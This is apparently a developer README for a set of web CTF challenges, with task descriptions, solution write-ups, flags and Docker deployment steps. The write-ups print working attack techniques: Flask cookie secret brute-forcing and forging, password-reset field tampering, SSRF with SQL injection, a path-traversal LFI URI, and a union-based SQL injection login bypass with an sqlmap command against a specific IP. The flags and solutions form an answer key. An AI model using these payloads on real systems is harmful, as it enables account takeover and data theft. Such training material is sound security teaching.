# codeboobsters__ctf
**This page is intended for ctf task developers**

# Web


## CoinFarmer
### Author
https://t.me/geen_stack
### Описание на русском
Приготовьтесь к уникальному приключению в мире CoinFarmer, где ваши навыки и терпение будут проверены на прочность! 🌾💰

На главной странице вас встретит яркая кнопка "Фармить коины" — каждое нажатие прибавляет +1 к вашему балансу. Но будьте осторожны: вам потребуется долго кликать, чтобы накопить нужное количество для покупки заветного флага в магазине.

Флаг стоит целых 99999999999999999999 коинов! Да, именно так! Но не забывайте, что за коины вы также можете приобретать другие товары, которые помогут вам на вашем пути к успеху. 

Перед вами стоит выбор: с упорством кликать до пенсии или проявить свои хакерские навыки, чтобы обойти игру и получить флаг быстрее. 🤖💻

CoinFarmer — это не просто игра, это испытание на ловкость и изобретательность. Каждый клик приближает вас к цели, но не забывайте, что подводные камни могут скрываться на каждом шагу. Готовы ли вы принять вызов и стать мастером фарминга? 🌟

Погружайтесь в мир CoinFarmer и докажите, что вы достойны стать обладателем флага!

### Описание на английском
Get ready for a unique adventure in the world of CoinFarmer, where your skills and patience will be put to the test! 🌾💰

On the main page, you'll find a bright "Farm Coins" button — each click adds +1 to your balance. But be careful: you'll need to click for a long time to accumulate the necessary amount to buy the coveted flag in the store.

The flag costs a whopping 99999999999999999999 coins! Yes, that's right! But don't forget that you can also purchase other items with your coins that will help you on your path to success.

You have a choice: click tirelessly until retirement, or unleash your hacking skills to bypass the game and get the flag faster. 🤖💻

CoinFarmer is not just a game; it's a test of agility and ingenuity. Every click brings you closer to your goal, but beware of the hidden pitfalls that may lurk at every turn. Are you ready to accept the challenge and become a farming master? 🌟

Dive into the world of CoinFarmer and prove that you deserve to be the owner of the flag!

### Разбор на русском
Это задание связано с эксплуатацией уязвимости в веб-приложении, которое управляет балансом пользователей через сессионные куки. Информация о балансе хранится в сессионном объекте, который может быть декодирован и изменен для получения несанкционированного доступа. Вот разбор процесса:
1. Сессионные куки: Приложение хранит баланс монет пользователя и купленные товары в сессионных куках. Это можно представить как:
```
{'coins':0, 'products':[]}
```
2.  Управление балансом: Приложение проверяет текущий баланс пользователя, когда он пытается купить товар:
```
@app.route('/buy/<id>', methods=["GET"])
def buy(id):
    current_balance = session["coins"] 
       
    if current_balance < product["price"]:
        return render_template("no_money.html", product=product)
       
    session["coins"] = current_balance - product["price"]
    session["products"].append(product)
```
3. Уязвимость: В приложении используется слабый секрет для подписи куки. Если вы сможете восстановить этот секрет, вы сможете изменить значения куки и повторно подписать их, что позволит вам несанкционированно вносить изменения.
4. Шаги атаки::
	Шаг 1: Установка: Установите необходимый инструмент flask-unsign.
	```
	pip3 install flask-unsign
	```
	Шаг 2: Брутфорс секрета: Используйте словарь для брутфорса секрета, используемого для подписи куки. Это выполняется следующей командой:
	```
	 python3 -m flask_unsign --wordlist rockyou.txt --unsign --cookie "session-cookie-here" --no-literal-eval
	```
	 Шаг 3: Изменение куки: После того, как секрет известен, вы можете создать новые куки с высоким значением монет (например, 199999999999999999999). Подпишите и примените эти куки обратно в своем браузере:
	 ```
	python3 -m flask_unsign --sign --cookie "{'coins':199999999999999999999}" --secret "flask_secret" --legacy
	```
	Финальный шаг: С измененныи куки вы теперь можете купить желаемый товар (например, флаг) благодаря завышенному балансу.

### Разбор на английском
This task involves exploiting a vulnerability in a web application that manages user balances through session cookies. The balance information is stored in a session object, which can be decoded and manipulated to gain unauthorized access. Here’s a breakdown of the process:
1. Session Cookies: The application stores the user’s coin balance and purchased products in session cookies, which can be represented as:
```
{'coins':0, 'products':[]}
```
2. Balance Management: The application checks the user’s current balance when attempting to purchase a product:
```
@app.route('/buy/<id>', methods=["GET"])
def buy(id):
    current_balance = session["coins"] 
       
    if current_balance < product["price"]:
        return render_template("no_money.html", product=product)
       
    session["coins"] = current_balance - product["price"]
    session["products"].append(product)
```
3. Vulnerability: The application has a weak secret used to sign the cookies. If you can recover this secret, you can modify cookie values and re-sign them, allowing for unauthorized modifications.
4. Attack Steps:
	Step 1: Installation: Install the necessary tool, flask-unsign, which is used for unsigning and signing Flask cookies.
	```
	pip3 install flask-unsign
	```
	Step 2: Brute Force the Secret: Use a wordlist to brute-force the secret used for signing the cookies. This is done with the following command:
	```
	 python3 -m flask_unsign --wordlist rockyou.txt --unsign --cookie "session-cookie-here" --no-literal-eval
	```
	 Step 3: Modify Cookie: Once the secret is known, you can create a new cookie with a high coin balance (e.g., 199999999999999999999). Sign and apply this cookie back in your browser:
	 ```
	python3 -m flask_unsign --sign --cookie "{'coins':199999999999999999999}" --secret "flask_secret" --legacy
	```
	Final Step: With the modified cookie in place, you can now purchase the desired product (like the flag) due to the inflated balance.
### Flag
```
tqlCTF{w34k_s3cr3t_f0r_s3ss10n_c00ck13s}
```

### Развертывание
При необходимости отредактируй флаг в /app/products.json (в объекте products[4], с id=5)

#### Далее нужно собрать образ
```
docker build -t coinfarmer .
```

#### Запуск контейнера
```
docker run -p 5000:5000 coinfarmer
```
---

## Galery
### Author
https://t.me/geen_stack
### Описание на русском
Погрузитесь в мир Galery: Ваше персональное пространство для фотоснимков! 📸

Представляем Galery – уникальное веб-приложение, которое позволяет вам не просто загружать фотографии, а создавать собственную галерею незабываемых моментов! 

✨ Почему стоит выбрать Galery?

- Простой и удобный интерфейс: Легкий в навигации дизайн позволяет вам быстро загружать и просматривать свои фотографии без лишних усилий.
  
- Безопасность ваших данных: Мы понимаем, насколько важна конфиденциальность ваших изображений, и создаем все условия для их защиты.

- Доступ к вашим фото в любое время и в любом месте: С Galery вы сможете легко делиться своими воспоминаниями с друзьями и семьей, где бы вы ни находились.

- Инновационные функции: Мы постоянно улучшаем Galery, добавляя новые возможности для редактирования и организации ваших фотоколлекций.

📅 Присоединяйтесь к Galery уже сегодня! Загружайте свои фотографии, создавайте альбомы и наслаждайтесь простотой и удобством работы с вашим руслом воспоминаний. Нам важно ваше мнение, и мы рады приветствовать вас в нашем сообществе!

Ваши моменты достойны лучших условий – выберите Galery для их хранения! 🌟

### Описание на английском
Dive into the World of Galery: Your Personal Space for Photos! 📸

Introducing Galery – a unique web application that allows you to not just upload photos, but to create your own gallery of unforgettable moments!

✨ Why Choose Galery?

- Simple and User-Friendly Interface: Our easy-to-navigate design enables you to upload and view your photos quickly and effortlessly.

- Data Security: We understand how important your image privacy is, and we create all conditions for its protection.

- Access Your Photos Anytime, Anywhere: With Galery, you can easily share your memories with friends and family no matter where you are.

- Innovative Features: We continuously improve Galery by adding new capabilities for editing and organizing your photo collections.

📅 Join Galery Today! Upload your photos, create albums, and enjoy the simplicity and convenience of managing your treasure trove of memories. Your feedback matters to us, and we are thrilled to welcome you to our community!

Your moments deserve the best – choose Galery for their storage! 🌟

### Разбор на русском
Задание можно выполнить достаточно просто, следуя нескольким шагам. 

1. Форма смены пароля содержит скрытое поле, в котором указан текущий логин пользователя. 
2. Недостаток безопасности: Функция смены пароля не проводит валидацию данного логина, что означает, что она не проверяет, соответствует ли логин отправителя запроса.
3. Перехват запроса: Задача заключается в том, чтобы перехватить запрос на смену пароля и внести изменения в передаваемый логин, подставив вместо него логин администратора (admin).
4. Доступ к админской галерее: После успешной смены пароля, можно войти в учетную запись администратора и получить доступ к его галерее. 

Таким образом, среди фотографий, загруженных администратором, можно будет найти флаг, который подтверждает успешное выполнение задания.

### Разбор на английском
Analysis of the Password Change Task

The task can be accomplished quite simply by following a few steps.

1. The password change form contains a hidden field that specifies the current user's login.
2. Security flaw: The password change function does not validate this login, meaning it does not check whether the login belongs to the user sending the request.
3. Intercepting the request: The task is to intercept the password change request and modify the submitted login, replacing it with the admin's login (admin).
4. Accessing the admin gallery: After successfully changing the password, one can log into the admin account and gain access to their gallery.

Thus, among the photos uploaded by the admin, there will be a flag that confirms the successful completion of the task.
### Flag
```
tqlCTF{1ns3cur3_p@ssw0rd_ch4ng3_funct10n}
```

### Развертывание
#### Собрать образ
```
docker build -t galery .
```
#### Запуск контейнера
```
docker run -p 5000:5000 galery
```
---
## Converter
### Author
https://t.me/geen_stack
### Описание на русском
🌟 Приложение PDF Converter: Ваш Необходимый Инструмент для Легкого Преобразования! 🌟

🖥️ Встречайте PDF Converter - невероятно мощное и удобное приложение для преобразования веб-контента в стильные PDF-документы! 🌐✨

🔧 Скажите "Прощай!" сложным и неудобным форматам! 
С помощью PDF Converter вы можете легко и быстро конвертировать любые веб-страницы в качественные PDF-файлы всего за пару кликов. Доступно на ваших устройствах - удобство всегда под рукой!

📌 Основные Возможности:
- Простота использования: Просто введите URL страницы, и наш умный алгоритм сделает все за вас!
- Высокое качество: PDF Converter сохраняет структуру и дизайн оригинала, чтобы ваши документы всегда выглядели профессионально.
- Доступность: Конвертируйте документы из любой точки мира, когда угодно и где угодно!
- Безопасность и конфиденциальность: Мы заботимся о вашей безопасности. Все ваши данные защищены!

🚀 Для кого это приложение?
- Для студентов, которым нужно быстро создавать конспекты.
- Для профессионалов, которые хотят делиться важной информацией без потери качества.
- Для всех, кто ценит свое время и удобство!

🌈 Преобразуйте свой рабочий процесс с PDF Converter!  Скачайте приложение прямо сейчас и откройте для себя новые горизонты легкости и эффективности в работе с документами
### Описание на английском
🌟 PDF Converter App: Your Essential Tool for Effortless Conversion! 🌟

🖥️ Introducing PDF Converter - an incredibly powerful and user-friendly application for converting web content into stylish PDF documents! 🌐✨

🔧 Say "Goodbye!" to complicated and inconvenient formats! 
With PDF Converter, you can easily and quickly convert any web page into high-quality PDF files with just a couple of clicks. Available on your devices - convenience is always at your fingertips!

📌 Key Features:
- Ease of Use: Simply enter the URL of the page, and our smart algorithm will do everything for you!
- High Quality: PDF Converter preserves the structure and design of the original, ensuring your documents always look professional.
- Accessibility: Convert documents from anywhere in the world, anytime, and anywhere!
- Safety and Privacy: We care about your security. All your data is protected!

🚀 Who is this app for?
- For students who need to quickly create summaries.
- For professionals who want to share important information without losing quality.
- For anyone who values their time and convenience!

🌈 Transform your workflow with PDF Converter! Download the app right now and discover new horizons of ease and efficiency in working with documents!

### Разбор на русском
Форма ввода URL содержит SSRF, при сканировании адреса 127.0.0.1 на порту 5000 выявлено еще одно приложение - валидатор тикетов. Данное приложение принимает на вход GET-параметр number и ищет совпадения в базе данных и уязвимо к Boolean-based SQL инъекции.

### Разбор на английском
The URL input form contains SSRF. When scanning the address 127.0.0.1 on port 5000, another application was discovered - a ticket validator. This application accepts a GET parameter called number and searches for matches in the database, making it vulnerable to Boolean-based SQL injection.

### Flag
```
tqlCTF{y0u_c4n_h4ck_1ntern4l_s3rv1c3_g00d_j0b}
```

### Развертывание
#### Собрать образ
```
docker build -t converter .
```

#### Запуск контейнера
```
docker run -p 80:80 converter
```

---

## hr_board
### Author
https://t.me/geen_stack
### Описание на русском
🔍 Ищите талант в IT? Мы поможем!

Представляем вам революционное приложение для поиска и найма специалистов в сфере информационных технологий! 🖥️👩‍💻

Почему выбирают нас?

🌟 Широкий выбор кандидатов: Наша база данных включает в себя профессионалов с различным опытом и навыками, от начинающих разработчиков до опытных инженеров. 

⚙️ Умные фильтры поиска: Найдите идеального кандидата всего за несколько кликов. Используйте фильтры по языкам программирования, уровням опыта, местоположению и другим критериям.

📊 Детализированные профили: Изучайте полные профили кандидатов, включая портфолио и отзывы, а также их достижения и навыки.

🤝 Легкость сотрудничества: Обменивайтесь сообщениями, назначайте интервью и получайте доступ к полезным ресурсам по найму, всё в одном приложении!

### Описание на английском
🔍 Looking for IT Talent? We Can Help!

Introducing a revolutionary app for finding and hiring specialists in the information technology field! 🖥️👩‍💻

Why Choose Us?

🌟 Wide Range of Candidates: Our database includes professionals with varying experience and skills, from budding developers to seasoned engineers.

⚙️ Smart Search Filters: Find the perfect candidate in just a few clicks. Use filters based on programming languages, experience levels, location, and more.

📊 Detailed Profiles: Explore comprehensive candidate profiles, including portfolios and reviews, as well as their achievements and skills.

🤝 Easy Collaboration: Exchange messages, schedule interviews, and access helpful hiring resources—all within one app!

### Разбор на русском
На главной странице представлена поисковая строка, в которой логика поиска подвержена SQL-инъекциям. Уязвимость можно обнаружить всего за пару кликов, однако в самой базе данных пока нет информации.

Как выявить уязвимость:

При изучении того, как отображаются анкеты, можно заметить следующий HTML-код:

```
<div class="card-body">
    <h5 class="card-title">
        David Brown
    </h5>
    
    <p class="card-text">
        Job Description: DevOps Engineer - Collaborate with development and operations teams to implement CI/CD pipelines, automate processes, and improve system reliability.
    </p>

    <img src="/avatars.php?avatar=4.png&return_image=true" style="width:200px; height:200px;">
    
    <p class="card-text">
        Salary waiting: 787 $
    </p>
    
</div>
```
Ключевым элементом является скрипт avatars.php, отвечающий за рендеринг аватарок из объявлений. Интересно, что он подвержен уязвимости Local File Inclusion (LFI) по URI:

```
/avatars.php?avatar=../../../../../etc/flag.txt&return_image=true
```

Чтобы извлечь данные с помощью LFI, необходимо передать параметр return_image, который не очевиден, однако о его наличии можно догадаться при внимательном изучении кода страницы. Это добавляет уровень сложности для злоумышленника.
### Разбор на английском
The main page features a search bar, where the search logic is vulnerable to SQL injection. This vulnerability can be discovered with just a few clicks, although there is currently no information in the database.

How to Identify the Vulnerability:

By examining how the profiles are displayed, you can notice the following HTML code:

```
<div class="card-body">
    <h5 class="card-title">
        David Brown
    </h5>
    
    <p class="card-text">
        Job Description: DevOps Engineer - Collaborate with development and operations teams to implement CI/CD pipelines, automate processes, and improve system reliability.
    </p>

    <img src="/avatars.php?avatar=4.png&return_image=true" style="width:200px; height:200px;">
    
    <p class="card-text">
        Salary waiting: 787 $
    </p>
    
</div>
```
A key component is the avatars.php script, which is responsible for rendering avatars from the announcements. Interestingly, it is vulnerable to Local File Inclusion (LFI) through the URI:
```
/avatars.php?avatar=../../../../../etc/flag.txt&return_image=true
```

To extract data using LFI, it is necessary to pass the parameter return_image, which is not obvious. However, its presence can be inferred by closely examining the page code, adding a level of complexity for the attacker.

### Flag
```
tqlCTF{y0u_must_f1nd_4ll_vulns_f0r_3v3ry_4ppl1c4t10n}
```

### Развертывание

```
docker-compose up
```

Доступ к таску через порт 8080


---

## A_PiV0_budet?
### Author
https://t.me/cherepawwka
### Описание на русском
Тебе лучше взять эту пинту...

### Описание на английском
You better get this pinta...

### Разбор на русском
Это несложное задание, суть которого сводится к анализу JS, содержащего API маршруты.

Первым делом открываем задание, тыкаем кнопки, перехватываем запросы при помощи Burp (или любого другого прокси), изучаем исходники и понимаем, как всё работает. По пути /static/api.js находим скрипт, который и отвечает за этот функционал:
```
...
const response = await fetch(`/api/v1.0/drinks/search?query=${query}`);
...
const response = await fetch('/api/v1.0/drinks');
...
```
Понимаем, что приложение имеет 2 маршрута для работы со списком напитков.

Попытавшись зацепиться за первый из них с параметром query, ничего не находим. Маршрут неуязвим.
Возвращаемся к названию задания:
```
A_PIv0_budet?
APIv0budet?
API_v0_budet?
API_v0_budet)
```
Пытаемся понизить версию API до нулевой:
<img width="729" alt="image" src="https://github.com/user-attachments/assets/62dd4b4d-4998-4647-b13a-5c40be0358e6">

Далее, так как у нас есть поле поиска, первое, что приходит на ум — SQL Injection.
Пробуем проверить, вставив кавычку и простую нагрузку or 1=1:
<img width="731" alt="image" src="https://github.com/user-attachments/assets/d2646e1a-0ffe-4d04-a757-c077b8e85094">

Отлично, у нас есть уязвимость! Осталось извлечь информацию из таблиц.

Теперь идём на любой ресурс, где подробно описано, как крутить подобные инъекции (напирмер, сюда: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/).
Поэтапно определяем версию БД (здесь в качестве БД используется SQLite) и вытаскиваем её структуру:
<img width="856" alt="image" src="https://github.com/user-attachments/assets/aa5cb75b-d730-45e6-8bec-5cf1edaec5a5">


Находим таблицу flag31337 с полем flag_value_tql_ctf, значение из которого нам и нужно извлечь:
<img width="854" alt="image" src="https://github.com/user-attachments/assets/b9530c4c-0e69-4dec-bf0c-a6ced08532cd">


### Развертывание
```
docker build . -t apivobudet
docker run -d -p 80:80 apivobudet
```

To stop container
```
docker ps -a  # get ID
docker stop ID
```

---

## Yet another auth form
### Author
https://t.me/cherepawwka
### Описание на русском
Думаю, вы поняли ;)

### Описание на английском
I guess, you get the point ;)

### Разбор на русском
Сложное задание на обход механизма аутентификации, в ходе которого предстоит узнать структуру базы данных и построить запрос, который учитывает эту структуру и ломает логику работы аутентификации.
Механизм аутентифкации работает следующим образом:
1. При вводе логина и пароля в форме осуществляется POST-запрос к приложению, в ходе которого пароль преобразуется в md5 хэш.
2. После этого осуществляется запрос к базе данных для поиска пользователя с таким именем и хэшем: `SELECT * FROM users WHERE username='{username}' and  hash='{printable_hash}'"`
3. Введена дополнительная принудительная проверка, в ходе которой извлечённый из базы данных хэш сверяется с хэшем пароля, переданного в форме.

*Примечание: изначально нагрузка типа `or 1=1;-- -` не должна была работать. Механизм аутентификации перед соревнованиями был изменён и нагрузка начала работать, чтобы сделать задание чуть более прозрачным для участников*.

Первым делом проверим, какой запрос уходит на бэкенд при попытке аутентификации:
```
POST /authbypass HTTP/1.1
Host: 195.200.18.108:10800
Content-Type: application/x-www-form-urlencoded
Content-Length: 25

username=123&password=123
```
Мы видим 2 поля, и если в любое их них вставить кавычку, то получим ошибку 500, что говорит о наличии SQL-инъекции.
<img width="686" alt="image" src="https://github.com/user-attachments/assets/406512d4-c72c-4423-b1ba-6f27992dcbf4">

Аналогично прошлому заданию, можем собственноручно узнать, какая БД работает на бэкенде. В данном случае это SQLite.

В этот раз воспользуемся SQLMap для извлечения данных:
```
sqlmap -u http://195.200.18.108:10800/authbypass --data='username=*&password=1' -batch --dbms=sqlite --all
```
<img width="360" alt="image" src="https://github.com/user-attachments/assets/154403e2-6426-4605-a195-2c3aef1d86e8">


БД состоит из одной таблицы users, в которой 3 колонки. Вероятно, в запросе возвращаются значения всех трёх колонок.
Также мы смогли извлечь хэш пароля администратора, но взломать его быстро не получается (т.к. для его генерации использовался довольно стойкий пароль). Нужно искать другой путь.
Попробуем сформировать запрос, который обманет логику работы механизма аутентификации. Аналогичные запросы можно найти, например, на hacktricks: https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/login-bypass/sql-login-bypass.md
В данном случае подойдут нагрузки, которые учитывают передачу нашего "известного" хэша пароля для пользователя. Так, нам не нужно будет знать пароль в открытом виде, ведь в запросе мы передадим хэш из нашего пароля, который же сами и вычислим:


Попробуем адаптировать запросы выше к нашему случаю:
```
md5(cherepawwka) = 428874936cb54b41723d4b6ce71ce834

Запрос:
POST /authbypass HTTP/1.1
Host: 195.200.18.108:10800
Content-Type: application/x-www-form-urlencoded
Content-Length: 116

username=123' and 1=0 union select 1,'admin','428874936cb54b41723d4b6ce71ce834' from users;-- -&password=cherepawwka
```
<img width="856" alt="image" src="https://github.com/user-attachments/assets/5edb0b0f-2435-48f8-91ce-57935eef9766">

Таким образом, мы обошли логику формы, забрав заветный флаг!

### Флаг
```
tqlCTF{C7F_l1k3_SQL1_4u7h_byp455}
```











